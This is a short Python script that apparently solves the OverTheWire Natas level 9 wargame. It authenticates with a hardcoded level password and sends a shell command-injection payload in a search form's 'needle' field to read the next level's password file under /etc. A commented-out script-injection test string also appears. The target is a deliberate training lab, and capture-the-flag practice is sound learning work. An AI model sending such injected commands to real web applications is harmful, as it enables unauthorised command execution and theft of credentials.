import requests
from requests.auth import HTTPBasicAuth

url="http://natas9.natas.labs.overthewire.org/"

session = requests.Session()

username="natas9"
password="W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"

# payload = "<script>alert(0)</script>"
payload = "; cat ../../../../etc/natas_webpass/natas10"

data = {
	"needle": payload,
	"submit":"Search"
}

req = session.post(url, auth=HTTPBasicAuth(username, password), data = data)

print(req.text)